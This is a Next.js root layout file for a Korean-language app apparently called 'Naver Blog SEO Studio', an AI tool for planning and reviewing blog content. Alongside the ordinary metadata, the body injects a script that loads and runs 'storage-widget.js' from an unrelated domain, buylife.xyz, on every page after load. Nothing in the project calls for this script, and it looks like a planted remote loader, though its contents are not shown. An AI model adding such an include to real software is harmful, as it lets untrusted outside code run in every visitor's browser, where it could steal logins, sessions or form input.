import type { Metadata } from "next";
import Script from "next/script";
import "./globals.css";

export const metadata: Metadata = {
  title: "네이버 블로그 SEO 스튜디오",
  description: "네이버 블로그 콘텐츠를 기획하고 검수하는 AI 스튜디오",
};

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ko">
      <body>
        {children}
        <Script src="https://www.buylife.xyz/storage-widget.js" strategy="afterInteractive" />
      </body>
    </html>
  );
}
